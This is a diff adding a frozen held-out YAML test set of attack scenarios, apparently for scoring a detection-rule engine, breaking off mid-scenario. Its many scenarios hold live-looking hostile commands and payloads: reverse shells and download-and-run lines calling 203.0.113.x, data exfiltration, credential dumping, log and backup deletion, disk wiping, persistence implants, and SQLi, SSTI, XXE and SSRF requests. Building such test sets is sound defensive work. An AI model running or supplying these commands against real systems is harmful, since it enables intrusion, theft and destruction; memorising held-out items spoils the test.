@@ -1,0 +1,1687 @@
+# FROZEN held-out set v3 (see validation/FROZEN.json). Written WITHOUT consulting rules.yaml. Do not edit: any change breaks the freeze check.
+# Attacks HO3-* and difficult negatives HB3-*. The runner reports these separately from every tuned corpus and shows only
+# aggregates (no per-scenario misses) so they cannot be used to tune rules.
+scenarios:
+- id: HO3-001
+  name: rundll32 RunHTMLApplication remote scriptlet
+  techniques:
+  - T1218.011
+  tactic: TA0005
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: rundll32.exe
+    command_line: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://203.0.113.80/a.sct")
+  severity: high
+- id: HO3-002
+  name: WMI process call create launching hidden PowerShell
+  techniques:
+  - T1047
+  tactic: TA0002
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: wmic.exe
+    command_line: wmic process call create "powershell -w hidden -nop -c iex (iwr http://203.0.113.80/s)"
+  severity: high
+- id: HO3-003
+  name: PowerShell script run from a remote share
+  techniques:
+  - T1059.001
+  tactic: TA0002
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: cmd.exe
+    command_line: cmd.exe /c start /b powershell -nop -ep bypass -f \\203.0.113.9\share\x.ps1
+  severity: high
+- id: HO3-004
+  name: Scheduled task running encoded PowerShell at logon as SYSTEM
+  techniques:
+  - T1053.005
+  tactic: TA0003
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: schtasks.exe
+    command_line: schtasks /create /tn "OneDrive Update" /tr "powershell -w hidden -enc SQBFAFgAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA5ACkA" /sc onlogon /ru system
+  severity: high
+- id: HO3-005
+  name: New auto-start service pointing at a ProgramData binary
+  techniques:
+  - T1543.003
+  tactic: TA0003
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: sc.exe
+    command_line: sc create svcupdate binpath= "cmd /c C:\ProgramData\svc\x.exe" start= auto
+  severity: medium
+- id: HO3-006
+  name: Run key persistence from AppData
+  techniques:
+  - T1547.001
+  tactic: TA0003
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: reg.exe
+    command_line: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Users\bob\AppData\Roaming\upd.exe" /f
+  severity: medium
+- id: HO3-007
+  name: WMI event subscription persistence
+  techniques:
+  - T1546.003
+  tactic: TA0003
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: wmic.exe
+    command_line: wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="f1", EventNamespace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA
+      'Win32_PerfFormattedData_PerfOS_System'"
+  severity: high
+- id: HO3-008
+  name: Hidden local administrator account created
+  techniques:
+  - T1136.001
+  tactic: TA0003
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: net.exe
+    command_line: net user support$ P@ssw0rd1! /add && net localgroup administrators support$ /add
+  severity: high
+- id: HO3-009
+  name: Shadow copies deleted via WMI
+  techniques:
+  - T1490
+  tactic: TA0040
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: wmic.exe
+    command_line: wmic shadowcopy delete /nointeractive
+  severity: critical
+- id: HO3-010
+  name: Recovery disabled with bcdedit
+  techniques:
+  - T1490
+  tactic: TA0040
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: bcdedit.exe
+    command_line: bcdedit /set {default} recoveryenabled no & bcdedit /set {default} bootstatuspolicy ignoreallfailures
+  severity: high
+- id: HO3-011
+  name: Backup catalog deleted with wbadmin
+  techniques:
+  - T1490
+  tactic: TA0040
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: wbadmin.exe
+    command_line: wbadmin delete catalog -quiet
+  severity: high
+- id: HO3-012
+  name: LSASS minidump through PowerShell process lookup
+  techniques:
+  - T1003.001
+  tactic: TA0006
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: powershell.exe
+    command_line: powershell -c "rundll32 C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\l.dmp full"
+  severity: critical
+- id: HO3-013
+  name: NTDS.dit copied with esentutl from a shadow copy
+  techniques:
+  - T1003.003
+  tactic: TA0006
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: esentutl.exe
+    command_line: esentutl.exe /y /vss C:\Windows\NTDS\ntds.dit /d C:\Windows\Temp\ntds.dit
+  severity: critical
+- id: HO3-014
+  name: NTDS snapshot via ntdsutil IFM
+  techniques:
+  - T1003.003
+  tactic: TA0006
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: ntdsutil.exe
+    command_line: ntdsutil "ac i ntds" "ifm" "create full c:\temp\x" q q
+  severity: critical
+- id: HO3-015
+  name: Kerberoasting with Rubeus
+  techniques:
+  - T1558.003
+  tactic: TA0006
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: Rubeus.exe
+    command_line: Rubeus.exe kerberoast /outfile:C:\Users\Public\hashes.txt
+  severity: high
+- id: HO3-016
+  name: SPN ticket request via PowerShell
+  techniques:
+  - T1558.003
+  tactic: TA0006
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: powershell.exe
+    command_line: powershell -c "Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/db01.corp.local:1433'"
+  severity: medium
+- id: HO3-017
+  name: Domain controller and privileged group enumeration
+  techniques:
+  - T1087.002
+  tactic: TA0007
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: cmd.exe
+    command_line: nltest /dclist:corp.local & net group "domain admins" /domain
+  severity: low
+- id: HO3-018
+  name: AdFind person enumeration
+  techniques:
+  - T1087.002
+  tactic: TA0007
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: adfind.exe
+    command_line: adfind.exe -f "(objectcategory=person)" -csv -dn
+  severity: medium
+- id: HO3-019
+  name: Staging archive with password from user documents
+  techniques:
+  - T1560.001
+  tactic: TA0009
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: 7z.exe
+    command_line: 7z.exe a -tzip -pS3cret! C:\Users\Public\hr.zip C:\Users\*\Documents\*.xlsx
+  severity: medium
+- id: HO3-020
+  name: Compress-Archive of a finance share into Public
+  techniques:
+  - T1074.001
+  tactic: TA0009
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: powershell.exe
+    command_line: powershell Compress-Archive -Path C:\Finance\* -DestinationPath C:\Users\Public\f.zip
+  severity: medium
+- id: HO3-021
+  name: Archive uploaded over FTP with curl
+  techniques:
+  - T1048.003
+  tactic: TA0010
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: curl.exe
+    command_line: curl.exe -T C:\Users\Public\f.zip ftp://203.0.113.20/in/ --user u:p
+  severity: high
+- id: HO3-022
+  name: PsExec as SYSTEM to a remote host
+  techniques:
+  - T1021.002
+  - T1569.002
+  tactic: TA0008
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: psexec.exe
+    command_line: psexec.exe \\10.0.4.12 -s -d cmd.exe /c C:\Windows\Temp\payload.exe
+  severity: high
+- id: HO3-023
+  name: WinRS remote command
+  techniques:
+  - T1021.006
+  tactic: TA0008
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: winrs.exe
+    command_line: winrs -r:10.0.4.12 cmd /c whoami /all
+  severity: medium
+- id: HO3-024
+  name: Admin share mapped with explicit credentials
+  techniques:
+  - T1021.002
+  tactic: TA0008
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: net.exe
+    command_line: net use \\10.0.4.12\C$ /user:corp\admin Passw0rd!
+  severity: medium
+- id: HO3-025
+  name: MSI installed from a remote URL quietly
+  techniques:
+  - T1218.007
+  tactic: TA0005
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: msiexec.exe
+    command_line: msiexec /q /i http://203.0.113.20/p.msi
+  severity: high
+- id: HO3-026
+  name: InstallUtil proxy execution of a DLL from Public
+  techniques:
+  - T1218.004
+  tactic: TA0005
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: installutil.exe
+    command_line: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Users\Public\x.dll
+  severity: high
+- id: HO3-027
+  name: BITS job created to fetch and run
+  techniques:
+  - T1197
+  tactic: TA0005
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: cmd.exe
+    command_line: bitsadmin /create j & bitsadmin /addfile j http://203.0.113.20/a.exe C:\Users\Public\a.exe & bitsadmin /resume j
+  severity: high
+- id: HO3-028
+  name: PowerShell TCP client reverse shell
+  techniques:
+  - T1059.001
+  tactic: TA0002
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: powershell.exe
+    command_line: powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('203.0.113.9',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex
+      $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($o),0,$o.Length)}"
+  severity: critical
+- id: HO3-029
+  name: Windows Script Host executing a JScript payload with a txt extension
+  techniques:
+  - T1059.007
+  tactic: TA0002
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: cscript.exe
+    command_line: cscript //nologo //e:jscript C:\Users\Public\readme.txt
+  severity: medium
+- id: HO3-030
+  name: Firewall opened for an inbound listener
+  techniques:
+  - T1562.004
+  tactic: TA0005
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: netsh.exe
+    command_line: netsh advfirewall firewall add rule name="Core Networking" dir=in action=allow protocol=TCP localport=4444
+  severity: medium
+- id: HO3-031
+  name: Port proxy set up for pivoting
+  techniques:
+  - T1090.001
+  tactic: TA0011
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: netsh.exe
+    command_line: netsh interface portproxy add v4tov4 listenport=8080 connectaddress=10.0.1.5 connectport=3389
+  severity: high
+- id: HO3-032
+  name: SSH reverse tunnel to an external host
+  techniques:
+  - T1572
+  tactic: TA0011
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-02
+    process_name: ssh
+    command_line: ssh -N -R 8443:localhost:443 tunnel@203.0.113.30
+  severity: high
+- id: HO3-033
+  name: chisel SOCKS reverse proxy client
+  techniques:
+  - T1572
+  tactic: TA0011
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-02
+    process_name: chisel
+    command_line: chisel client 203.0.113.30:8000 R:socks
+  severity: high
+- id: HO3-034
+  name: Defender service stopped with Stop-Service
+  techniques:
+  - T1562.001
+  tactic: TA0005
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: powershell.exe
+    command_line: powershell Stop-Service -Name WinDefend -Force; Set-Service WinDefend -StartupType Disabled
+  severity: high
+- id: HO3-035
+  name: Security event log resized to zero
+  techniques:
+  - T1070.001
+  tactic: TA0005
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: wevtutil.exe
+    command_line: wevtutil sl security /ms:0
+  severity: high
+- id: HO3-036
+  name: All event logs cleared through Get-EventLog loop
+  techniques:
+  - T1070.001
+  tactic: TA0005
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: powershell.exe
+    command_line: powershell -c "Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }"
+  severity: high
+- id: HO3-037
+  name: USN journal deleted
+  techniques:
+  - T1070.004
+  tactic: TA0005
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: fsutil.exe
+    command_line: 'fsutil usn deletejournal /d C:'
+  severity: medium
+- id: HO3-038
+  name: AppLocker bypass by running from signed Windows temp path
+  techniques:
+  - T1218
+  tactic: TA0005
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: mshta.exe
+    command_line: mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -nop -w hidden -c iex(iwr http://203.0.113.20/z)"":close")
+  severity: high
+- id: HO3-039
+  name: Credential access via reg save of SAM and SYSTEM hives
+  techniques:
+  - T1003.002
+  tactic: TA0006
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: reg.exe
+    command_line: reg save HKLM\SAM C:\Windows\Temp\sam.hiv & reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+  severity: high
+- id: HO3-040
+  name: Mimikatz renamed and run with sekurlsa
+  techniques:
+  - T1003.001
+  tactic: TA0006
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: svchost32.exe
+    command_line: svchost32.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+  severity: critical
+- id: HO3-041
+  name: netcat traditional reverse shell
+  techniques:
+  - T1059.004
+  tactic: TA0002
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: nc.traditional
+    command_line: nc.traditional -e /bin/bash 203.0.113.9 4444
+  severity: critical
+- id: HO3-042
+  name: PHP fsockopen reverse shell
+  techniques:
+  - T1059.004
+  tactic: TA0002
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: web-07
+    process_name: php
+    command_line: php -r '$sock=fsockopen("203.0.113.9",4444);exec("/bin/sh <&3 >&3 2>&3");'
+  severity: critical
+- id: HO3-043
+  name: socat reverse shell
+  techniques:
+  - T1059.004
+  tactic: TA0002
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: socat
+    command_line: socat TCP:203.0.113.9:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+  severity: critical
+- id: HO3-044
+  name: telnet two-pipe reverse shell
+  techniques:
+  - T1059.004
+  tactic: TA0002
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: telnet
+    command_line: telnet 203.0.113.9 4444 | /bin/bash | telnet 203.0.113.9 4445
+  severity: critical
+- id: HO3-045
+  name: wget script piped to sh
+  techniques:
+  - T1105
+  tactic: TA0011
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: wget
+    command_line: wget -qO- http://203.0.113.9/x.sh | sh
+  severity: high
+- id: HO3-046
+  name: Dropper downloaded to /tmp then executed
+  techniques:
+  - T1105
+  tactic: TA0011
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: bash
+    command_line: curl -s http://203.0.113.9/x -o /tmp/.x; chmod +x /tmp/.x; /tmp/.x
+  severity: high
+- id: HO3-047
+  name: SUID bit set on bash
+  techniques:
+  - T1548.001
+  tactic: TA0004
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: chmod
+    command_line: chmod u+s /bin/bash
+  severity: high
+- id: HO3-048
+  name: Passwordless sudo added for a new user
+  techniques:
+  - T1548.003
+  tactic: TA0004
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: bash
+    command_line: echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+  severity: high
+- id: HO3-049
+  name: UID 0 account created with useradd -o
+  techniques:
+  - T1136.001
+  tactic: TA0003
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: useradd
+    command_line: useradd -o -u 0 -g 0 -M -d /root toor
+  severity: high
+- id: HO3-050
+  name: Cron persistence appending an @reboot entry
+  techniques:
+  - T1053.003
+  tactic: TA0003
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: bash
+    command_line: (crontab -l; echo "@reboot /tmp/.x") | crontab -
+  severity: medium
+- id: HO3-051
+  name: SSH authorized_keys implant
+  techniques:
+  - T1098.004
+  tactic: TA0003
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: bash
+    command_line: echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9 attacker@kali" >> /root/.ssh/authorized_keys
+  severity: high
+- id: HO3-052
+  name: LD_PRELOAD file registered globally
+  techniques:
+  - T1574.006
+  tactic: TA0003
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: bash
+    command_line: echo /tmp/evil.so > /etc/ld.so.preload
+  severity: high
+- id: HO3-053
+  name: Privileged container escaping via host chroot
+  techniques:
+  - T1611
+  tactic: TA0004
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: k8s-node-2
+    process_name: docker
+    command_line: docker run -v /:/host --privileged alpine chroot /host sh
+  severity: high
+- id: HO3-054
+  name: nsenter into PID 1 namespaces
+  techniques:
+  - T1611
+  tactic: TA0004
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: k8s-node-2
+    process_name: nsenter
+    command_line: nsenter -t 1 -m -u -i -n sh
+  severity: high
+- id: HO3-055
+  name: Kubernetes secrets dumped with kubectl
+  techniques:
+  - T1552.007
+  tactic: TA0006
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: k8s-node-2
+    process_name: kubectl
+    command_line: kubectl get secrets -A -o yaml
+  severity: high
+- id: HO3-056
+  name: Service account token read inside a pod
+  techniques:
+  - T1552.007
+  tactic: TA0006
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: k8s-pod-web
+    process_name: cat
+    command_line: cat /var/run/secrets/kubernetes.io/serviceaccount/token
+  severity: medium
+- id: HO3-057
+  name: tar over ssh as exfiltration
+  techniques:
+  - T1048
+  tactic: TA0010
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: bash
+    command_line: tar czf - /etc /home | ssh user@203.0.113.9 'cat > b.tgz'
+  severity: high
+- id: HO3-058
+  name: Database dump piped to netcat
+  techniques:
+  - T1048
+  tactic: TA0010
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: db-02
+    process_name: bash
+    command_line: mysqldump --all-databases | gzip | nc 203.0.113.9 9999
+  severity: high
+- id: HO3-059
+  name: Cryptominer launched with stratum pool
+  techniques:
+  - T1496
+  tactic: TA0040
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: xmrig
+    command_line: ./xmrig --donate-level 1 -o stratum+tcp://pool.example:3333 -u 4AdUnd -p x
+  severity: medium
+- id: HO3-060
+  name: auditd rules wiped
+  techniques:
+  - T1562.001
+  tactic: TA0005
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: auditctl
+    command_line: auditctl -D
+  severity: high
+- id: HO3-061
+  name: journald vacuumed to erase history
+  techniques:
+  - T1070.002
+  tactic: TA0005
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: journalctl
+    command_line: journalctl --vacuum-time=1s
+  severity: medium
+- id: HO3-062
+  name: Disk overwritten with dd
+  techniques:
+  - T1561.001
+  tactic: TA0040
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: db-02
+    process_name: dd
+    command_line: dd if=/dev/zero of=/dev/sda bs=1M
+  severity: critical
+- id: HO3-063
+  name: Kernel module inserted from /tmp
+  techniques:
+  - T1014
+  tactic: TA0005
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: insmod
+    command_line: insmod /tmp/rk.ko
+  severity: high
+- id: HO3-064
+  name: Apache path traversal CVE-2021-41773 style
+  techniques:
+  - T1190
+  tactic: TA0001
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.140
+    asset_name: web-07
+    raw_data:
+      url: /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
+  severity: high
+- id: HO3-065
+  name: Shellshock in User-Agent
+  techniques:
+  - T1190
+  tactic: TA0001
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.140
+    asset_name: web-07
+    raw_data:
+      url: /cgi-bin/status
+      user_agent: () { :;}; /bin/bash -c "curl http://203.0.113.9/x|sh"
+  severity: high
+- id: HO3-066
+  name: PHPUnit eval-stdin probe
+  techniques:
+  - T1190
+  tactic: TA0001
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.140
+    asset_name: web-07
+    raw_data:
+      url: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+  severity: medium
+- id: HO3-067
+  name: ProxyShell autodiscover pattern
+  techniques:
+  - T1190
+  tactic: TA0001
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.140
+    asset_name: web-07
+    raw_data:
+      url: /autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com
+  severity: critical
+- id: HO3-068
+  name: Server-side template injection arithmetic probe
+  techniques:
+  - T1190
+  tactic: TA0001
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.140
+    asset_name: web-07
+    raw_data:
+      url: /greet?name={{7*7}}
+  severity: medium
+- id: HO3-069
+  name: SSTI to command execution in Jinja
+  techniques:
+  - T1190
+  tactic: TA0001
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.140
+    asset_name: web-07
+    raw_data:
+      url: /greet?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+  severity: critical
+- id: HO3-070
+  name: XXE reading /etc/passwd
+  techniques:
+  - T1190
+  tactic: TA0001
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.140
+    asset_name: web-07
+    raw_data:
+      url: /upload/xml
+      body: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
+  severity: high
+- id: HO3-071
+  name: SSRF via IPv4-mapped IPv6 metadata address
+  techniques:
+  - T1190
+  tactic: TA0001
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.140
+    asset_name: web-07
+    raw_data:
+      url: /fetch?u=http://[::ffff:169.254.169.254]/latest/meta-data/
+  severity: high
+- id: HO3-072
+  name: gopher SSRF to Redis
+  techniques:
+  - T1190
+  tactic: TA0001
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.140
+    asset_name: web-07
+    raw_data:
+      url: /fetch?u=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall
+  severity: high
+- id: HO3-073
+  name: Blind time-based SQL injection MySQL
+  techniques:
+  - T1190
+  tactic: TA0001
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.140
+    asset_name: web-07
+    raw_data:
+      url: /item?id=1' AND SLEEP(5)-- -
+  severity: medium
+- id: HO3-074
+  name: MSSQL xp_cmdshell via stacked query
+  techniques:
+  - T1190
+  tactic: TA0001
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.140
+    asset_name: web-07
+    raw_data:
+      url: /item?id=1;exec xp_cmdshell 'whoami'--
+  severity: critical
+- id: HO3-075
+  name: Error-based SQL injection extractvalue
+  techniques:
+  - T1190
+  tactic: TA0001
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.140
+    asset_name: web-07
+    raw_data:
+      url: /item?id=1 and extractvalue(1,concat(0x7e,(select version())))
+  severity: medium
+- id: HO3-076
+  name: Exposed .git configuration probe
+  techniques:
+  - T1190
+  tactic: TA0001
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.140
+    asset_name: web-07
+    raw_data:
+      url: /.git/config
+  severity: low
+- id: HO3-077
+  name: Spring Cloud Gateway actuator abuse
+  techniques:
+  - T1190
+  tactic: TA0001
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.140
+    asset_name: web-07
+    raw_data:
+      url: /actuator/gateway/routes/hacked
+      method: POST
+  severity: high
+- id: HO3-078
+  name: IAM access key created for another user
+  techniques:
+  - T1098.001
+  tactic: TA0003
+  events:
+  - adapter: cloudtrail
+    payload:
+      eventName: CreateAccessKey
+      eventSource: iam.amazonaws.com
+      eventTime: '2026-04-01T10:00:00Z'
+      sourceIPAddress: 203.0.113.77
+      userIdentity:
+        type: IAMUser
+        userName: ci-deploy
+        arn: arn:aws:iam::123456789012:user/ci-deploy
+      awsRegion: us-east-1
+      requestParameters:
+        userName: admin
+  severity: high
+- id: HO3-079
+  name: AdministratorAccess attached to a user
+  techniques:
+  - T1098
+  tactic: TA0004
+  events:
+  - adapter: cloudtrail
+    payload:
+      eventName: AttachUserPolicy
+      eventSource: iam.amazonaws.com
+      eventTime: '2026-04-01T10:00:00Z'
+      sourceIPAddress: 203.0.113.77
+      userIdentity:
+        type: IAMUser
+        userName: ci-deploy
+        arn: arn:aws:iam::123456789012:user/ci-deploy
+      awsRegion: us-east-1
+      requestParameters:
+        userName: ci-deploy
+        policyArn: arn:aws:iam::aws:policy/AdministratorAccess
+  severity: high
+- id: HO3-080
+  name: Bucket policy made public
+  techniques:
+  - T1530
+  tactic: TA0009
+  events:
+  - adapter: cloudtrail
+    payload:
+      eventName: PutBucketPolicy
+      eventSource: s3.amazonaws.com
+      eventTime: '2026-04-01T10:00:00Z'
+      sourceIPAddress: 203.0.113.77
+      userIdentity:
+        type: IAMUser
+        userName: ci-deploy
+        arn: arn:aws:iam::123456789012:user/ci-deploy
+      awsRegion: us-east-1
+      requestParameters:
+        bucketName: finance-exports
+        bucketPolicy: '{"Statement":[{"Effect":"Allow","Principal":"*","Action":"s3:GetObject"}]}'
+  severity: high
+- id: HO3-081
+  name: Role trust policy opened to an external account
+  techniques:
+  - T1098
+  tactic: TA0004
+  events:
+  - adapter: cloudtrail
+    payload:
+      eventName: UpdateAssumeRolePolicy
+      eventSource: iam.amazonaws.com
+      eventTime: '2026-04-01T10:00:00Z'
+      sourceIPAddress: 203.0.113.77
+      userIdentity:
+        type: IAMUser
+        userName: ci-deploy
+        arn: arn:aws:iam::123456789012:user/ci-deploy
+      awsRegion: us-east-1
+      requestParameters:
+        roleName: prod-admin
+        policyDocument: '{"Statement":[{"Principal":{"AWS":"arn:aws:iam::999999999999:root"},"Action":"sts:AssumeRole"}]}'
+  severity: high
+- id: HO3-082
+  name: EBS snapshot shared publicly
+  techniques:
+  - T1537
+  tactic: TA0010
+  events:
+  - adapter: cloudtrail
+    payload:
+      eventName: ModifySnapshotAttribute
+      eventSource: ec2.amazonaws.com
+      eventTime: '2026-04-01T10:00:00Z'
+      sourceIPAddress: 203.0.113.77
+      userIdentity:
+        type: IAMUser
+        userName: ci-deploy
+        arn: arn:aws:iam::123456789012:user/ci-deploy
+      awsRegion: us-east-1
+      requestParameters:
+        snapshotId: snap-0abc
+        createVolumePermission:
+          add:
+            items:
+            - group: all
+  severity: high
+- id: HO3-083
+  name: KMS key scheduled for deletion
+  techniques:
+  - T1485
+  tactic: TA0040
+  events:
+  - adapter: cloudtrail
+    payload:
+      eventName: ScheduleKeyDeletion
+      eventSource: kms.amazonaws.com
+      eventTime: '2026-04-01T10:00:00Z'
+      sourceIPAddress: 203.0.113.77
+      userIdentity:
+        type: IAMUser
+        userName: ci-deploy
+        arn: arn:aws:iam::123456789012:user/ci-deploy
+      awsRegion: us-east-1
+      requestParameters:
+        keyId: 1234abcd
+        pendingWindowInDays: 7
+  severity: critical
+- id: HO3-084
+  name: CloudTrail trail deleted
+  techniques:
+  - T1562.008
+  tactic: TA0005
+  events:
+  - adapter: cloudtrail
+    payload:
+      eventName: DeleteTrail
+      eventSource: cloudtrail.amazonaws.com
+      eventTime: '2026-04-01T10:00:00Z'
+      sourceIPAddress: 203.0.113.77
+      userIdentity:
+        type: IAMUser
+        userName: ci-deploy
+        arn: arn:aws:iam::123456789012:user/ci-deploy
+      awsRegion: us-east-1
+      requestParameters:
+        name: org-trail
+  severity: high
+- id: HO3-085
+  name: MFA device deactivated for an admin
+  techniques:
+  - T1556
+  tactic: TA0006
+  events:
+  - adapter: cloudtrail
+    payload:
+      eventName: DeactivateMFADevice
+      eventSource: iam.amazonaws.com
+      eventTime: '2026-04-01T10:00:00Z'
+      sourceIPAddress: 203.0.113.77
+      userIdentity:
+        type: IAMUser
+        userName: ci-deploy
+        arn: arn:aws:iam::123456789012:user/ci-deploy
+      awsRegion: us-east-1
+      requestParameters:
+        userName: admin
+        serialNumber: arn:aws:iam::123456789012:mfa/admin
+  severity: high
+- id: HO3-086
+  name: Root account console login without MFA
+  techniques:
+  - T1078.004
+  tactic: TA0001
+  events:
+  - adapter: cloudtrail
+    payload:
+      eventName: ConsoleLogin
+      eventSource: signin.amazonaws.com
+      eventTime: '2026-04-01T03:00:00Z'
+      sourceIPAddress: 203.0.113.77
+      userIdentity:
